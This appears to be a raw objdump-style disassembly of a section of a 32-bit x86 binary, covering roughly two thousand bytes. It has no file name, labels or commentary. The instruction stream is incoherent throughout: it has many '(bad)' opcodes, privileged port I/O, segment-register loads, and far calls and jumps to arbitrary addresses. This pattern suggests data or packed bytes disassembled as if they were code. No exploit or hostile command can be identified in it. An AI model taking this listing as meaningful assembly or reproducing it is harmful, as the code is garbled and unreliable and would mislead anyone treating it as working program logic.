  4136aa:	not    DWORD PTR [edx+0x5c]
  4136ad:	rcr    DWORD PTR [edi-0x22dc2fe4],cl
  4136b3:	sbb    BYTE PTR ds:0xaed284f8,0x60
  4136ba:	and    dh,cl
  4136bc:	lods   al,BYTE PTR ds:[esi]
  4136bd:	mov    edi,0x203e0b0
  4136c2:	mov    esi,0xd5a8d348
  4136c7:	popa   
  4136c8:	jns    0x413710
  4136ca:	add    ebx,0xffffffd3
  4136cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136ce:	stc    
  4136cf:	cmc    
  4136d0:	or     ebx,DWORD PTR [eax]
  4136d2:	sahf   
  4136d3:	cld    
  4136d4:	push   edx
  4136d5:	xor    esp,DWORD PTR [edx-0x2d]
  4136d8:	(bad)  
  4136d9:	fdivr  QWORD PTR [ecx+0x6c]
  4136dc:	mov    edx,gs
  4136de:	xchg   ebx,eax
  4136df:	and    eax,0x82571585
  4136e4:	push   ebp
  4136e5:	mov    dh,0x49
  4136e7:	mov    bh,0xea
  4136e9:	mov    ch,0x8f
  4136eb:	aas    
  4136ec:	loope  0x413698
  4136ee:	add    esi,ebp
  4136f0:	jbe    0x41374a
  4136f2:	ret    0x8485
  4136f5:	pop    esp
  4136f6:	daa    
  4136f7:	nop
  4136f8:	inc    DWORD PTR [esi]
  4136fa:	xchg   edi,eax
  4136fb:	fld    TBYTE PTR [eax-0xe8f4405]
  413701:	pop    esi
  413702:	jecxz  0x41368d
  413704:	aad    0xe2
  413706:	mov    bh,0xe
  413708:	or     eax,0x41e686a1
  41370d:	xchg   dh,ah
  41370f:	push   ss
  413710:	(bad)  
  413711:	fwait
  413712:	mov    esp,0x1e7cde64
  413717:	aaa    
  413718:	sar    DWORD PTR [eax+0x5127192a],1
  41371e:	inc    esp
  41371f:	mov    edx,0x12c50151
  413724:	cmp    al,0x8
  413726:	cmp    al,0x71
  413728:	aam    0xa5
  41372a:	cwde   
  41372b:	ja     0x413778
  41372d:	add    BYTE PTR [esi],dh
  41372f:	popa   
  413730:	fdiv   st(3),st
  413732:	push   0x373438a4
  413737:	jo     0x4136f5
  413739:	jno    0x413702
  41373b:	push   DWORD PTR [edi-0x1d]
  41373e:	xchg   ebx,eax
  41373f:	ret    0x7fc5
  413742:	mov    esi,0xfb2e6ae4
  413747:	jle    0x4137a3
  413749:	(bad)  
  41374a:	repnz xchg ecx,eax
  41374c:	jno    0x413784
  41374e:	sbb    dl,BYTE PTR [eax+0x7f]
  413751:	mov    bh,0x7b
  413753:	data16 mov ds:0xbe54a5cb,al
  413759:	popa   
  41375a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375b:	inc    edi
  41375c:	cmp    al,0x32
  41375e:	push   ecx
  41375f:	mov    ch,0xf2
  413761:	pop    ss
  413762:	retf   0xb1b4
  413765:	ss shr ebp,cl
  413768:	pop    es
  413769:	jg     0x413750
  41376b:	repnz sub ebp,esi
  41376e:	outs   dx,BYTE PTR cs:[esi]
  413770:	inc    ebp
  413771:	fs in  al,0x95
  413774:	push   cs
  413775:	mov    ebp,0x3883052b
  41377a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41377b:	sbb    BYTE PTR [esi-0x56],0x80
  41377f:	nop
  413780:	repz data16 ds mov ch,0xdd
  413785:	xor    eax,edx
  413787:	scas   eax,DWORD PTR es:[edi]
  413788:	push   cs
  413789:	int    0xa9
  41378b:	fmul   QWORD PTR [edx]
  41378d:	retf   0xd6cf
  413790:	shr    BYTE PTR [edi+ebp*1-0x16de07f6],1
  413797:	mov    eax,ds:0x9820b581
  41379c:	sbb    al,0x16
  41379e:	mov    DWORD PTR [eax],edi
  4137a0:	fwait
  4137a1:	dec    esi
  4137a2:	sbb    edi,DWORD PTR [ecx+0x4]
  4137a5:	rol    DWORD PTR [ebx+0x1bacb082],cl
  4137ab:	mov    cl,0x18
  4137ad:	hlt    
  4137ae:	inc    ebp
  4137af:	ins    BYTE PTR es:[edi],dx
  4137b0:	inc    eax
  4137b1:	sbb    ecx,DWORD PTR [ecx+edi*2+0x7dfb3067]
  4137b8:	call   0xb7fd:0x468610de
  4137bf:	jne    0x41378c
  4137c1:	into   
  4137c2:	and    cl,dh
  4137c4:	push   eax
  4137c5:	ret    0x6a83
  4137c8:	repz xor dl,BYTE PTR [ecx+0xc]
  4137cc:	not    BYTE PTR [eax+0x1d8ee495]
  4137d2:	daa    
  4137d3:	pop    es
  4137d4:	lock pop ebp
  4137d6:	(bad)  
  4137d7:	popa   
  4137d8:	xchg   ecx,eax
  4137d9:	xchg   BYTE PTR [eax-0x6dbe1a99],ch
  4137df:	push   edx
  4137e0:	sbb    DWORD PTR [ecx+0x4a],ecx
  4137e3:	aad    0x4d
  4137e5:	mov    al,0x12
  4137e7:	inc    ebx
  4137e8:	inc    esi
  4137e9:	outs   dx,BYTE PTR ds:[esi]
  4137ea:	stos   BYTE PTR es:[edi],al
  4137eb:	xchg   edi,eax
  4137ec:	push   0xfffffffb
  4137ee:	fstp   QWORD PTR [edx]
  4137f0:	mov    edx,0x644f65d
  4137f5:	mov    ah,0xde
  4137f7:	aaa    
  4137f8:	cmc    
  4137f9:	mov    dh,0x6f
  4137fb:	test   BYTE PTR [edx-0x1c0c6718],0x9f
  413802:	int3   
  413803:	add    DWORD PTR [ecx-0x4a77135d],ecx
  413809:	add    eax,0x92b1c255
  41380e:	lea    ebx,[ecx+0x33]
  413811:	or     esp,eax
  413813:	xor    ebx,0xf9d35e90
  413819:	cmp    BYTE PTR [ebx+0x5c13084a],bh
  41381f:	repz jo 0x41381e
  413822:	(bad)  
  413824:	push   cs
  413825:	cmp    bl,cl
  413827:	push   ebp
  413828:	or     al,0x70
  41382a:	add    al,0xb5
  41382c:	inc    ebp
  41382d:	mov    bh,0xd6
  41382f:	xchg   edx,ebx
  413831:	in     al,dx
  413832:	xchg   edi,eax
  413833:	fld    TBYTE PTR [esp+eax*2+0x7bacef33]
  41383a:	je     0x4137f6
  41383c:	sbb    eax,0x1aeb42aa
  413841:	xor    al,0xdb
  413843:	scas   al,BYTE PTR es:[edi]
  413844:	mov    DWORD PTR [edx],ebx
  413846:	sbb    ebp,0x50
  413849:	inc    ecx
  41384a:	add    esp,ecx
  41384c:	xchg   BYTE PTR [esi],bl
  41384e:	in     eax,dx
  41384f:	ins    BYTE PTR es:[edi],dx
  413850:	lea    esp,[ecx]
  413852:	mov    ebx,DWORD PTR [edi+0xf0b8b9b]
  413858:	ins    BYTE PTR es:[edi],dx
  413859:	in     eax,0x98
  41385b:	cmp    al,0x1a
  41385d:	xlat   BYTE PTR ds:[ebx]
  41385e:	repz and esp,DWORD PTR [ebx]
  413861:	sar    DWORD PTR ds:0x67f4febb,0xe6
  413868:	mov    eax,0xdac097f4
  41386d:	call   0xdd66525b
  413872:	int3   
  413873:	call   DWORD PTR [ecx]
  413875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413876:	cdq    
  413877:	inc    ecx
  413878:	into   
  413879:	mov    esp,0xb59c7fc5
  41387e:	dec    ebx
  41387f:	dec    ecx
  413880:	outs   dx,BYTE PTR ds:[esi]
  413881:	push   ebx
  413882:	and    ecx,DWORD PTR [edx-0x65]
  413885:	cdq    
  413886:	ins    BYTE PTR es:[edi],dx
  413887:	pop    edx
  413888:	xor    BYTE PTR [ecx-0x68d191a5],dh
  41388e:	xor    eax,0x1db5e89a
  413893:	pusha  
  413894:	cmp    bh,BYTE PTR [esi+edi*4]
  413897:	inc    ecx
  413898:	ffree  st(4)
  41389a:	and    edx,edx
  41389c:	addr16 xchg ebp,eax
  41389e:	mov    ecx,cs
  4138a0:	(bad)  
  4138a1:	jno    0x41389e
  4138a3:	push   eax
  4138a4:	std    
  4138a5:	sub    al,dh
  4138a7:	mov    ah,0x15
  4138a9:	adc    BYTE PTR [ecx+0x19],al
  4138ac:	inc    ebp
  4138ad:	push   0x4e
  4138af:	pop    eax
  4138b0:	xor    ebx,DWORD PTR [ebx]
  4138b2:	(bad)  
  4138b4:	sbb    dh,bl
  4138b6:	aaa    
  4138b7:	repz and BYTE PTR [esi],0x6d
  4138bb:	mov    al,0x10
  4138bd:	scas   eax,DWORD PTR es:[edi]
  4138be:	xchg   edi,eax
  4138bf:	pop    esp
  4138c0:	sub    al,0x5
  4138c2:	adc    BYTE PTR [esi+0x3c606fc4],bl
  4138c8:	push   0x82367f30
  4138cd:	mov    bl,0x95
  4138cf:	and    edi,esi
  4138d1:	or     ecx,ebp
  4138d3:	repz dec eax
  4138d5:	out    0x5,eax
  4138d7:	sti    
  4138d8:	outs   dx,DWORD PTR ds:[esi]
  4138d9:	pushf  
  4138da:	mov    eax,ds:0x6d5f158e
  4138df:	adc    ah,0xd1
  4138e2:	jecxz  0x41393d
  4138e4:	push   esp
  4138e5:	xchg   edx,eax
  4138e6:	push   ss
  4138e7:	int3   
  4138e8:	inc    ebx
  4138e9:	mov    esp,0x9c85481a
  4138ee:	ror    DWORD PTR ds:0x892293cc,0xd3
  4138f6:	imul   edi,DWORD PTR [ecx+0x78],0x5dc4bce2
  4138fd:	stos   DWORD PTR es:[edi],eax
  4138fe:	or     BYTE PTR [ebx],bh
  413900:	mov    dh,0xa8
  413902:	pop    esi
  413903:	fs (bad) 
  413905:	push   ds
  413906:	xor    BYTE PTR ds:0xfd2e00f,0xc7
  41390d:	sub    cl,cl
  41390f:	fnstcw WORD PTR [esi+0x23]
  413912:	div    edx
  413914:	xor    al,0x7c
  413916:	out    dx,eax
  413917:	mov    esi,0x754838dc
  41391c:	mov    ds:0x9b52023d,al
  413921:	xor    bl,dl
  413923:	push   ss
  413924:	mov    edi,0xd1cbaf01
  413929:	cmp    eax,0x53f73916
  41392e:	pop    es
  41392f:	mov    al,0xe6
  413931:	(bad)  
  413932:	fsubr  DWORD PTR [edx+0x53]
  413935:	xor    BYTE PTR [ecx+0x65],0x7b
  413939:	jle    0x4138c6
  41393b:	jo     0x4138dc
  41393d:	call   0x406902c6
  413942:	lods   eax,DWORD PTR ds:[esi]
  413943:	icebp  
  413944:	sbb    bl,BYTE PTR [ebx-0x34]
  413947:	out    0xbb,eax
  413949:	hlt    
  41394a:	and    ecx,DWORD PTR [eax]
  41394c:	and    al,0xd4
  41394e:	push   ebx
  41394f:	mov    ebx,0x5a49ee39
  413954:	test   eax,0xa0da7777
  413959:	ds out 0x2,eax
  41395c:	or     DWORD PTR [ecx-0x73446b12],ebx
  413962:	pop    edx
  413963:	jecxz  0x4139cc
  413965:	xor    ch,cl
  413967:	jno    0x413924
  413969:	in     eax,dx
  41396a:	addr16 mov ebp,0xf71699ba
  413970:	jmp    0xf85de807
  413975:	and    ebp,DWORD PTR [eax+edi*1-0x2ddbb843]
  41397c:	outs   dx,DWORD PTR ds:[esi]
  41397d:	adc    al,0xc6
  41397f:	pop    edx
  413980:	arpl   WORD PTR [ebx-0x66],sp
  413983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413984:	jbe    0x41392e
  413986:	cmp    al,0xc6
  413988:	push   0x8a74af48
  41398d:	(bad)  
  41398e:	cmp    bh,BYTE PTR [edx-0x3c3c0e38]
  413994:	test   eax,0xd2977159
  413999:	pop    edx
  41399a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41399c:	xchg   ebx,eax
  41399d:	loop   0x4139ab
  41399f:	cli    
  4139a0:	mov    cs,WORD PTR [edi]
  4139a2:	dec    ebp
  4139a3:	mov    cl,0x7f
  4139a5:	xor    al,0x0
  4139a7:	or     eax,0xcba9f5c3
  4139ac:	test   BYTE PTR [esi+0x1028e0c0],cl
  4139b2:	xchg   ebx,eax
  4139b3:	xor    DWORD PTR [esi-0x5a],esi
  4139b6:	fcmovnbe st,st(1)
  4139b8:	pop    ebx
  4139b9:	cmp    dh,BYTE PTR [ecx-0x685468d]
  4139bf:	ins    DWORD PTR es:[edi],dx
  4139c0:	push   ds
  4139c1:	shl    al,cl
  4139c3:	or     DWORD PTR [ecx-0x59],0xffffffed
  4139c7:	les    edi,FWORD PTR [edx]
  4139c9:	add    al,0xed
  4139cb:	mov    ebp,DWORD PTR [ebx+0x12]
  4139ce:	js     0x413974
  4139d0:	cmp    BYTE PTR cs:[edi-0x6f],dl
  4139d4:	jmp    0x41396a
  4139d6:	xchg   ecx,eax
  4139d7:	mov    BYTE PTR [eax+eax*4+0x34],bh
  4139db:	in     eax,0x3d
  4139dd:	sbb    esi,DWORD PTR [ebp-0x49bc8b0d]
  4139e3:	ret    0x64ad
  4139e6:	stc    
  4139e7:	inc    edi
  4139e8:	sub    dh,bh
  4139ea:	iret   
  4139eb:	adc    al,0xc3
  4139ed:	push   ss
  4139ee:	fisub  WORD PTR [edi-0x4e8b79af]
  4139f4:	clc    
  4139f5:	mov    ds:0x3b008148,al
  4139fa:	iret   
  4139fb:	xchg   ebx,eax
  4139fc:	and    ah,BYTE PTR [edi+0x752c066]
  413a02:	les    ebp,FWORD PTR [eax+edi*2+0xa]
  413a06:	xlat   BYTE PTR ds:[ebx]
  413a07:	sar    DWORD PTR [esi],0xfc
  413a0a:	lea    ecx,[edi-0x5b]
  413a0d:	(bad)  ss:[esi+0x50]
  413a11:	mov    bh,0x92
  413a13:	push   DWORD PTR [edi+eiz*2]
  413a16:	arpl   WORD PTR [ecx+edi*1],sp
  413a19:	test   BYTE PTR [ecx],0xd5
  413a1c:	adc    al,0x94
  413a1e:	jmp    0xff679da1
  413a23:	shl    BYTE PTR [eax-0x3c],0x9b
  413a27:	xor    al,BYTE PTR [edi+0x35]
  413a2a:	push   0x53
  413a2c:	push   edi
  413a2d:	pop    ebp
  413a2e:	data16 jg 0x413a99
  413a31:	popf   
  413a32:	mov    WORD PTR [esi],ds
  413a34:	cld    
  413a35:	mov    al,ds:0x5507c13e
  413a3a:	popa   
  413a3b:	push   esi
  413a3c:	mov    al,ds:0xf587fab
  413a41:	sbb    eax,0x243173d8
  413a46:	jo     0x413a17
  413a48:	adc    ebx,DWORD PTR [edi]
  413a4a:	mov    eax,ds:0x140a26cd
  413a4f:	arpl   sp,bp
  413a51:	mov    ebx,0xe2f1c865
  413a56:	jge    0x413acc
  413a58:	and    dh,dh
  413a5a:	rol    dh,cl
  413a5c:	push   ecx
  413a5d:	cld    
  413a5e:	std    
  413a5f:	iret   
  413a60:	fild   QWORD PTR [ecx+0x35]
  413a63:	(bad)  
  413a64:	pop    esi
  413a65:	and    eax,0x7de3c5e2
  413a6a:	sbb    al,0xea
  413a6c:	je     0x413abc
  413a6e:	test   al,0x17
  413a70:	xor    esp,edi
  413a72:	xchg   ebp,eax
  413a73:	retf   
  413a74:	(bad)  
  413a75:	mov    ah,0xac
  413a77:	icebp  
  413a78:	int3   
  413a79:	pop    esp
  413a7a:	int3   
  413a7b:	ret    
  413a7c:	dec    ecx
  413a7d:	mov    cl,0x26
  413a7f:	les    esp,FWORD PTR [esi]
  413a81:	stos   DWORD PTR es:[edi],eax
  413a82:	out    dx,eax
  413a83:	mov    ds:0x9a25da2,al
  413a88:	aad    0x29
  413a8a:	scas   eax,DWORD PTR es:[edi]
  413a8b:	loop   0x413a28
  413a8d:	leave  
  413a8e:	jno    0x413af1
  413a90:	scas   eax,DWORD PTR es:[edi]
  413a91:	fdecstp 
  413a93:	bnd jnp 0x413a64
  413a96:	dec    esi
  413a97:	xor    edx,DWORD PTR [ecx+edx*4]
  413a9a:	aas    
  413a9b:	lea    esi,[ecx-0x8]
  413a9e:	xchg   esi,eax
  413a9f:	scas   eax,DWORD PTR es:[edi]
  413aa0:	sahf   
  413aa1:	xchg   ebx,eax
  413aa2:	stc    
  413aa3:	push   es
  413aa4:	imul   ebp,DWORD PTR [ecx-0xd],0xdbb73847
  413aab:	shl    DWORD PTR [ebx-0x3ab7e934],1
  413ab1:	jmp    0xad32:0x8e1e5f3
  413ab8:	jns    0x413acc
  413aba:	mov    ah,0x22
  413abc:	out    dx,al
  413abd:	push   ss
  413abe:	xchg   dl,bh
  413ac0:	push   es
  413ac1:	pop    ds
  413ac2:	fist   WORD PTR [ebp+esi*1-0x68d2efd1]
  413ac9:	lock inc eax
  413acb:	push   edx
  413acc:	cmp    bl,BYTE PTR [eax-0x5]
  413acf:	bound  esp,QWORD PTR [eax]
  413ad1:	sub    eax,0xed7c5b8
  413ad6:	or     eax,0xa54e7ad3
  413adb:	pushf  
  413adc:	cmp    eax,0xd1a3750c
  413ae1:	mov    ecx,0xc4d83361
  413ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae7:	jno    0x413b4f
  413ae9:	bound  edx,QWORD PTR [ebx+0x50]
  413aec:	mov    ch,0x46
  413aee:	iret   
  413aef:	sbb    ch,ah
  413af1:	call   0x2701d665
  413af6:	xor    BYTE PTR [ecx],dl
  413af8:	cmp    edx,0x3c
  413afb:	outs   dx,BYTE PTR ds:[esi]
  413afc:	ins    BYTE PTR es:[edi],dx
  413afd:	out    0xcb,eax
  413aff:	pop    edx
  413b00:	pop    ebp
  413b01:	int    0x8e
  413b03:	lahf   
  413b04:	mov    dl,dh
  413b06:	or     DWORD PTR [eax-0x21],edi
  413b09:	adc    ah,bh
  413b0b:	adc    al,0xa0
  413b0d:	scas   al,BYTE PTR es:[edi]
  413b0e:	mov    eax,0xf45daf8
  413b13:	loope  0x413ac8
  413b15:	pushf  
  413b16:	mov    WORD PTR [edx],?
  413b18:	dec    esi
  413b19:	mov    bh,0x37
  413b1b:	pop    ds
  413b1c:	(bad)  
  413b1d:	(bad)  
  413b1e:	sub    DWORD PTR [edx],0xfffffffa
  413b21:	cld    
  413b22:	xor    DWORD PTR [ecx],eax
  413b24:	fsubr  DWORD PTR [edi-0x22186fa7]
  413b2a:	mov    al,ds:0x694a2f3d
  413b2f:	push   0x857bf8aa
  413b34:	mov    BYTE PTR ds:0x1c9b0fae,ch
  413b3a:	test   eax,0x63d588cd
  413b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b40:	das    
  413b41:	jae    0x413b5b
  413b43:	inc    ebp
  413b44:	pop    ds
  413b45:	retf   0xfa1a
  413b48:	push   ss
  413b49:	cli    
  413b4a:	fcmovu st,st(5)
  413b4c:	test   eax,0xb2187f19
  413b51:	pop    edi
  413b52:	sub    dh,BYTE PTR [edx]
  413b54:	xor    BYTE PTR [esi-0x39],ch
  413b57:	dec    BYTE PTR ds:0x86e8d9c0
  413b5d:	mov    edi,0xea21869f
  413b62:	pop    ss
  413b63:	mov    eax,0x3dd2b7b3
  413b68:	out    0xcd,eax
  413b6a:	jnp    0x413b64
  413b6c:	adc    cl,BYTE PTR [esi+0x66]
  413b6f:	dec    eax
  413b70:	sbb    DWORD PTR es:[edi-0x58],edx
  413b74:	sub    BYTE PTR [edx],dl
  413b76:	mov    ecx,0x20a9b7db
  413b7b:	add    ebp,DWORD PTR [ebx+0x24]
  413b7e:	mov    bl,0xba
  413b80:	mov    dl,0xd3
  413b82:	mov    al,ds:0xd4e2c75a
  413b87:	shl    DWORD PTR [edx],cl
  413b89:	xchg   ecx,eax
  413b8a:	sub    dl,BYTE PTR [esi+0x69]
  413b8d:	sbb    eax,0x18cef722
  413b92:	mov    esi,0x51e74da4
  413b97:	aam    0xf7
  413b99:	push   edi
  413b9a:	dec    edx
  413b9b:	aad    0x48
  413b9d:	xchg   ebp,eax
  413b9e:	lds    ecx,FWORD PTR [edx]
  413ba0:	jmp    0x413bf0
  413ba2:	or     BYTE PTR [ecx],cl
  413ba4:	sahf   
  413ba5:	out    0x1e,eax
  413ba7:	js     0x413b87
  413ba9:	xor    BYTE PTR [ecx-0x252282c9],dh
  413baf:	test   eax,0xc144b053
  413bb4:	mov    edx,0x22ba9744
  413bb9:	or     eax,0x480dae7d
  413bbe:	scas   eax,DWORD PTR es:[edi]
  413bbf:	leave  
  413bc0:	retf   0x99ff
  413bc3:	js     0x413b4c
  413bc5:	(bad)  
  413bc6:	jnp    0x413bdc
  413bc8:	repnz mov ch,0x83
  413bcb:	cwde   
  413bcc:	or     BYTE PTR [edx+0x15dd51f5],al
  413bd2:	pop    edx
  413bd3:	sub    al,0xab
  413bd5:	test   BYTE PTR [ecx],dl
  413bd7:	fcmovbe st,st(0)
  413bd9:	mov    cl,0xfa
  413bdb:	lods   al,BYTE PTR ds:[esi]
  413bdc:	in     al,dx
  413bdd:	sahf   
  413bde:	mov    ds:0x5944785e,eax
  413be3:	jle    0x413c1c
  413be5:	sti    
  413be6:	add    ch,0x41
  413be9:	sbb    edx,DWORD PTR [ecx+0x46]
  413bec:	aam    0x50
  413bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bef:	call   0xcd91:0x8abb2669
  413bf6:	xchg   esp,eax
  413bf7:	cmp    dh,al
  413bf9:	psubusw mm7,mm3
  413bfc:	std    
  413bfd:	xchg   esi,eax
  413bfe:	sub    DWORD PTR [ecx-0x4c],ebx
  413c01:	jmp    0x4f78fa21
  413c06:	int    0x32
  413c08:	mov    BYTE PTR [ecx-0x44],bl
  413c0b:	dec    BYTE PTR [eax-0xb]
  413c0e:	cmp    DWORD PTR [edx+0x6e83bea0],ebx
  413c14:	and    BYTE PTR [eax+0x4ec46238],dl
  413c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c1b:	jle    0x413be7
  413c1d:	jmp    0xc7c81a45
  413c22:	jb     0x413c07
  413c24:	pop    es
  413c25:	test   al,0x3f
  413c27:	adc    eax,0x1da36098
  413c2c:	push   cs
  413c2d:	aas    
  413c2e:	fs dec ebx
  413c30:	adc    al,0x22
  413c32:	and    DWORD PTR [edi],edi
  413c34:	dec    ebx
  413c35:	inc    ebp
  413c36:	je     0x413c67
  413c38:	ss and al,0xd4
  413c3b:	icebp  
  413c3c:	mov    al,BYTE PTR [ebx]
  413c3e:	cdq    
  413c3f:	mov    ch,0xb2
  413c41:	repnz in eax,dx
  413c43:	jg     0x413c6d
  413c45:	or     eax,0xc7230f19
  413c4a:	xchg   esp,eax
  413c4b:	push   ecx
  413c4c:	jge    0x413cc6
  413c4e:	outs   dx,DWORD PTR ds:[esi]
  413c4f:	sahf   
  413c50:	push   edx
  413c51:	dec    edi
  413c52:	xor    eax,0x3ab89e63
  413c57:	xchg   BYTE PTR [edi-0xf],bh
  413c5a:	stos   BYTE PTR es:[edi],al
  413c5b:	fdivr  DWORD PTR [eax-0x176095ad]
  413c61:	mov    bl,BYTE PTR [esi]
  413c63:	jo     0x413c97
  413c65:	dec    ebp
  413c66:	or     ch,BYTE PTR [esi+0x34]
  413c69:	jp     0x413c0b
  413c6b:	or     edx,edx
  413c6d:	test   dh,bl
  413c6f:	mov    BYTE PTR [ecx],ch
  413c71:	enter  0x3821,0x93
  413c75:	pop    edi
  413c76:	fcomp  DWORD PTR [ecx]
  413c78:	out    dx,al
  413c79:	mov    bl,0xe0
  413c7b:	jnp    0x413cea
  413c7d:	ror    DWORD PTR [esp+ecx*2-0x12],cl
  413c81:	mov    ds:0x2ef83904,al
  413c86:	int    0xb5
  413c88:	jbe    0x413c64
  413c8a:	popf   
  413c8b:	lahf   
  413c8c:	retf   
  413c8d:	in     al,0xa2
  413c8f:	xchg   esi,eax
  413c90:	js     0x413cf3
  413c92:	repz (bad) 
  413c94:	rcr    edx,1
  413c96:	test   al,0x86
  413c98:	lea    ebp,cs:[ecx]
  413c9b:	lods   eax,DWORD PTR ds:[esi]
  413c9c:	adc    eax,0x5a879881
  413ca1:	mov    esi,0x3995cd70
  413ca6:	add    ebp,0xffffffa3
  413ca9:	mov    ebp,0x23374b59
  413cae:	and    eax,0x4b16f906
  413cb3:	clc    
  413cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb5:	xchg   BYTE PTR [edx+0x42],cl
  413cb8:	or     BYTE PTR [eax-0x6643807f],al
  413cbe:	push   esp
  413cbf:	add    ch,0x90
  413cc2:	out    0xfb,al
  413cc4:	inc    eax
  413cc5:	fcomp  QWORD PTR [edx-0x17]
  413cc8:	xchg   esp,eax
  413cc9:	xchg   ecx,eax
  413cca:	lds    edx,FWORD PTR [ecx+ebp*2-0x42]
  413cce:	mov    ecx,0x12c34856
  413cd3:	lock sub BYTE PTR [edx-0x45],ah
  413cd7:	retf   0x3371
  413cda:	jl     0x413c9f
  413cdc:	pop    ecx
  413cdd:	and    dl,BYTE PTR [ebx-0x36]
  413ce0:	pop    ebx
  413ce1:	add    DWORD PTR [edi],esi
  413ce3:	(bad)  
  413ce4:	pop    ds
  413ce5:	mov    dl,BYTE PTR [edi]
  413ce7:	xchg   esi,eax
  413ce8:	sbb    eax,0xe0057eb4
  413ced:	daa    
  413cee:	lods   eax,DWORD PTR ds:[esi]
  413cef:	sbb    al,0xc5
  413cf1:	(bad)  
  413cf2:	xor    BYTE PTR [edx+0x12],dl
  413cf5:	aad    0xbd
  413cf7:	cwde   
  413cf8:	je     0x413d20
  413cfa:	fwait
  413cfb:	out    dx,al
  413cfc:	lahf   
  413cfd:	mov    edi,0xbc669bdc
  413d02:	bound  esi,QWORD PTR [eax+ecx*8]
  413d05:	(bad)  
  413d06:	sbb    al,0x68
  413d08:	pop    esi
  413d09:	in     eax,0x47
  413d0b:	sti    
  413d0c:	inc    ecx
  413d0d:	inc    ebp
  413d0e:	mov    cl,0xa1
  413d10:	pop    ebx
  413d11:	xor    DWORD PTR [ebp-0x1f1166f9],0x147a27c6
  413d1b:	or     eax,0x4336b098
  413d20:	mov    BYTE PTR [ecx],ch
  413d22:	mov    al,ds:0xb4f14531
  413d27:	ds inc edx
  413d29:	sbb    al,0xaa
  413d2b:	icebp  
  413d2c:	aam    0x17
  413d2e:	mov    ds,WORD PTR [ebx+0x6]
  413d31:	and    eax,DWORD PTR [esi-0x4f]
  413d34:	stc    
  413d35:	sub    ecx,esi
  413d37:	mov    esp,0x354311c1
  413d3c:	hlt    
  413d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3e:	xor    bl,BYTE PTR ds:0x560a485e
  413d44:	int3   
  413d45:	sub    bh,dl
  413d47:	sti    
  413d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d49:	xchg   esi,eax
  413d4a:	add    al,BYTE PTR [ebx]
  413d4c:	enter  0x1269,0x4b
  413d50:	into   
  413d51:	outs   dx,DWORD PTR ds:[esi]
  413d52:	inc    edi
  413d53:	cld    
  413d54:	dec    ebp
  413d55:	cmc    
  413d56:	cdq    
  413d57:	inc    ebx
  413d58:	scas   al,BYTE PTR es:[edi]
  413d59:	rcr    BYTE PTR [ebx-0x63],0x5f
  413d5d:	outs   dx,DWORD PTR ds:[esi]
  413d5e:	jecxz  0x413da2
  413d60:	jmp    FWORD PTR [esi-0x1c5eaa85]
  413d66:	cmp    edi,eax
  413d68:	or     eax,0x15ce59c4
  413d6d:	pusha  
  413d6e:	jmp    0x413d5f
  413d70:	shl    BYTE PTR [ebp+0x7e],1
  413d73:	fs mov ah,0x38
  413d76:	repz sbb al,0xf7
  413d79:	pop    esi
  413d7a:	enter  0x5c25,0xdf
  413d7e:	aad    0x3e
  413d80:	dec    esi
  413d81:	xlat   BYTE PTR ds:[ebx]
  413d82:	je     0x413d4b
  413d84:	fcomi  st,st(7)
  413d86:	ss mov edi,0x9a7905c9
  413d8c:	test   eax,0xde605608
  413d91:	mov    ah,0x2d
  413d93:	xchg   ebx,eax
  413d94:	inc    ecx
  413d95:	dec    ebx
  413d96:	aam    0x8a
  413d98:	cmp    al,0x18
  413d9a:	call   0xcdd1:0x7c33c1dd
  413da1:	cmp    dh,BYTE PTR [edx+0x656230de]
  413da7:	(bad)  
  413da8:	cs (bad) 
  413daa:	dec    si
  413dac:	xor    bh,BYTE PTR [ebp-0x20]
  413daf:	inc    ecx
  413db0:	push   ebp
  413db1:	aaa    
  413db2:	mov    bh,0xd7
  413db4:	push   ss
  413db5:	imul   ebx,ebx,0x38179c67
  413dbb:	dec    ebx
  413dbc:	pop    edx
  413dbd:	and    dh,al
  413dbf:	pop    es
  413dc0:	xchg   esp,eax
  413dc1:	pop    eax
  413dc2:	dec    ebp
  413dc3:	shr    DWORD PTR [eax+0x70],1
  413dc6:	jge    0x413d70
  413dc8:	mov    esi,0xe779e31d
  413dcd:	cmp    ah,BYTE PTR [ebp-0x10e2d10e]
  413dd3:	push   0x3d6bd714
  413dd8:	dec    ecx
  413dd9:	xor    bl,dl
  413ddb:	pusha  
  413ddc:	lods   al,BYTE PTR ds:[esi]
  413ddd:	jns    0x413df5
  413ddf:	(bad)  
  413de0:	popa   
  413de1:	sbb    ah,BYTE PTR [eax]
  413de3:	stc    
  413de4:	in     al,dx
  413de5:	loope  0x413e18
  413de7:	and    BYTE PTR [ebx],ch
  413de9:	int3   
  413dea:	loopne 0x413db4
  413dec:	js     0x413d7e
  413dee:	les    ebx,FWORD PTR ds:0xdf77cc14
  413df4:	jg     0x413e4b
  413df6:	ret    0x5276
  413df9:	sbb    edx,esi
  413dfb:	sub    edx,DWORD PTR [ebp+0x24]
  413dfe:	shr    cl,0x25
  413e01:	push   cs
  413e02:	fsub   QWORD PTR [edx-0x663fe1a5]
  413e08:	cli    
  413e09:	int    0x2f
  413e0b:	adc    BYTE PTR [ebx-0x6028bdda],bh
  413e11:	scas   eax,DWORD PTR es:[edi]
  413e12:	stos   DWORD PTR es:[edi],eax
  413e13:	inc    esi
  413e14:	sub    BYTE PTR [eax],dl
  413e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e17:	mov    eax,ds:0x91e18778
  413e1c:	mov    ebp,0xdbf7366a
  413e21:	or     BYTE PTR [edi],ch
  413e23:	jno    0x413e0f
  413e25:	jg     0x413dbf
  413e27:	xor    DWORD PTR [eax-0x77a7eec8],0xffffffd9
